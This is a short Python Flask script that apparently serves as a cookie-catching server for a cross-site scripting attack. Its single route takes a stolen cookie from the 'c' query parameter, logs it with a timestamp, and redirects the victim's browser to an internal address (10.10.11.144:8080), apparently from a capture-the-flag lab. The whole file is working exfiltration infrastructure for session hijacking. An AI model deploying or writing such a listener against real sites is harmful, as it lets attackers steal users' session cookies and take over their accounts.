from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def cookie():
    cookie = request.args.get('c')
    print(cookie + ' ' + str(datetime.now()) + '\n')

    return redirect("http://10.10.11.144:8080")

if __name__ == "__main__":
    app.run(host= "0.0.0.0", port= 5000)